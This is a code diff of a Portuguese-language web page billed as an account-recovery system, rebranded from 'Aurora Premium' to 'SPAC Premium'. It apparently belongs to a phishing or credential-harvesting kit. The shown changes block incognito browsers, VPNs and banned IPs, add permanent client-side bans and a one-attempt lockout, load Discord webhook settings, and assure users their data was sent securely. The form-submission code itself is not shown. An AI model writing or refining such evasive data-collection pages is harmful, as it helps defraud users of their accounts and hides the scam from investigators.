+                localStorage.setItem('spac_block_until', blockUntil.toString());
                 
                 document.getElementById('submitBtn').disabled = true;
                 document.getElementById('submitBtn').style.opacity = '0.5';
@@ -3009,7 +2904,7 @@
                 if (timerInterval) clearInterval(timerInterval);
                 timerInterval = setInterval(updateTimer, 1000);
                 
-                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. ✨');
+                showNotification('✅', 'Dados Enviados!', 'Suas informações foram enviadas com segurança. 🌊');
                 showProcessingModal();
             } else {
                 document.getElementById('submitBtn').disabled = false;
@@ -3059,7 +2954,7 @@
 
         function closeSuccessModal() {
             document.getElementById('successModal').classList.remove('active');
-            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. ✨');
+            showNotification('🎉', 'Processo Iniciado!', 'A recuperação foi iniciada com sucesso. 🌊');
         }
 
         // ============================================================
@@ -3071,9 +2966,9 @@
                 position: fixed;
                 top: 100px;
                 right: 20px;
-                background: linear-gradient(135deg, rgba(10,5,21,0.95), rgba(26,13,46,0.95));
+                background: linear-gradient(135deg, rgba(10,14,23,0.95), rgba(13,27,42,0.95));
                 backdrop-filter: blur(20px);
-                border: 1px solid rgba(124,58,237,0.15);
+                border: 1px solid rgba(0,212,255,0.15);
                 border-radius: 12px;
                 padding: 1.2rem 1.5rem;
                 max-width: 350px;
@@ -3105,15 +3000,10 @@
             const processingModal = document.getElementById('processingModal');
             const successModal = document.getElementById('successModal');
             const termsModal = document.getElementById('termsModal');
-            const blockModal = document.getElementById('blockModal');
             
             if (event.target === processingModal) processingModal.classList.remove('active');
             if (event.target === successModal) successModal.classList.remove('active');
             if (event.target === termsModal) closeTermsModal();
-            if (event.target === blockModal) {
-                blockModal.classList.remove('active');
-                document.body.style.overflow = 'auto';
-            }
         });
 
         // ============================================================
@@ -3121,14 +3011,16 @@
         // ============================================================
         window.addEventListener('scroll', () => {
             const navbar = document.querySelector('.navbar');
-            navbar.style.background = window.scrollY > 10 ? 'rgba(10, 5, 21, 0.98)' : 'rgba(10, 5, 21, 0.95)';
+            if (navbar) {
+                navbar.style.background = window.scrollY > 10 ? 'rgba(10, 14, 23, 0.98)' : 'rgba(10, 14, 23, 0.95)';
+            }
         });
 
         // ============================================================
         // 18. RESTAURAR ESTADO DO BLOQUEIO
         // ============================================================
         function restoreBlockState() {
-            const saved = localStorage.getItem('aurora_block_until');
+            const saved = localStorage.getItem('spac_block_until');
             if (saved) {
                 const savedTime = parseInt(saved);
                 if (savedTime > Date.now()) {
@@ -3145,7 +3037,7 @@
                     timerInterval = setInterval(updateTimer, 1000);
                     updateTimer();
                 } else {
-                    localStorage.removeItem('aurora_block_until');
+                    localStorage.removeItem('spac_block_until');
                 }
             }
         }
@@ -3153,73 +3045,59 @@
         // ============================================================
         // 19. CONSOLE
         // ============================================================
-        console.log('%c✨ Aurora Premium v2.0 ✨', 'font-size:24px;font-weight:bold;color:#7c3aed;');
-        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#c084fc;');
+        console.log('%c🌊 SPAC Premium v1.0 🌊', 'font-size:24px;font-weight:bold;color:#00d4ff;');
+        console.log('%c🔒 Sistema de Recuperação de Contas', 'font-size:16px;color:#66e5ff;');
         console.log('%c⏳ 1 tentativa apenas | 9h de bloqueio', 'font-size:14px;color:#f59e0b;');
         console.log('%c🔒 Navegador anônimo bloqueado', 'font-size:14px;color:#ef4444;');
         console.log('%c🔒 Sistema de Banimento por IP ativado', 'font-size:14px;color:#ef4444;');
         console.log('%c🔒 Detecção de VPN/Proxy ativada', 'font-size:14px;color:#10b981;');
-        console.log('%c🔒 Detecção de navegador anônimo (via navegador)', 'font-size:14px;color:#10b981;');
         console.log('%c📡 Webhook configurada: ✅', 'font-size:14px;color:#10b981;');
-        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#c084fc;');
-        console.log('%c✨ Aurora System ✨', 'font-size:18px;font-weight:bold;color:#7c3aed;');
+        console.log('%c👥 Comunidade: Discord | Email | TikTok', 'font-size:14px;color:#00d4ff;');
+        console.log('%c🌊 SPAC System 🌊', 'font-size:18px;font-weight:bold;color:#00d4ff;');
 
         // ============================================================
         // 20. INICIAR
         // ============================================================
         async function init() {
-            // ===== 1. VERIFICAR NAVEGADOR ANÔNIMO (VIA NAVEGADOR - MAIS CONFIÁVEL) =====
+            if (localStorage.getItem('spac_blocked_permanent') === 'true') {
+                const reason = localStorage.getItem('spac_block_reason') || '🔒 Acesso bloqueado permanentemente.';
+                blockUserPermanently(reason);
+                return;
+            }
+
             console.log('🔍 Verificando navegador anônimo (via navegador)...');
             const isPrivateBrowser = await detectPrivateBrowsingBrowser();
             
             if (isPrivateBrowser) {
                 console.log('🚫 Acesso bloqueado: Navegador Anônimo detectado');
-                const blockModal = document.getElementById('blockModal');
-                const blockReason = document.getElementById('blockReason');
-                blockReason.textContent = '🔒 Navegador Anônimo/Incógnito Detectado\n\n❌ Navegadores anônimos não são permitidos por questões de segurança.';
-                blockModal.classList.add('active');
-                document.body.style.overflow = 'hidden';
+                blockUserPermanently('🔒 Navegador Anônimo/Incógnito Detectado');
                 return;
             }
             console.log('✅ Navegador normal, continuando...');
 
-            // ===== 2. VERIFICAR SE O IP ESTÁ BANIDO =====
             console.log('🔍 Verificando se o IP está banido...');
             const isBanned = await checkBanStatus();
             if (isBanned) {
                 console.log('🚫 Acesso bloqueado: IP banido');
-                return; // IMPEDE O ACESSO COMPLETO AO SITE
+                return;
             }
             console.log('✅ IP não está banido, continuando...');
 
-            // ===== 3. VERIFICAR NAVEGADOR ANÔNIMO E VPN (VIA API) =====
-            console.log('🔍 Verificando navegador e VPN via API...');
-            const detectResult = await checkDetection();
-            
-            if (detectResult && detectResult.blocked) {
-                console.log('🚫 Acesso bloqueado: Navegador anônimo ou VPN detectado');
+            console.log('🔍 Verificando navegador e VPN...');
+            const blocked = await checkBlocked();
+            if (blocked) {
+                console.log('🚭 Acesso bloqueado: Navegador Anônimo/VPN detectado');
                 return;
             }
             console.log('✅ Navegador e VPN OK!');
 
-            // Carregar informações do webhook do Discord
             console.log('🔗 Carregando informações do webhook...');
             await fetchWebhookInfo();
-            
-            // Verificar bloqueio de anônimo (APENAS - fallback)
-            const blocked = await checkBlocked();
-            if (blocked) {
-                console.log('🚭 Acesso bloqueado: Navegador Anônimo detectado');
-                return;
-            }
             
             restoreBlockState();
             checkTerms();
         }
 
-        // ============================================================
-        // 21. EXECUTAR
-        // ============================================================
         init();
     </script>
 </body>
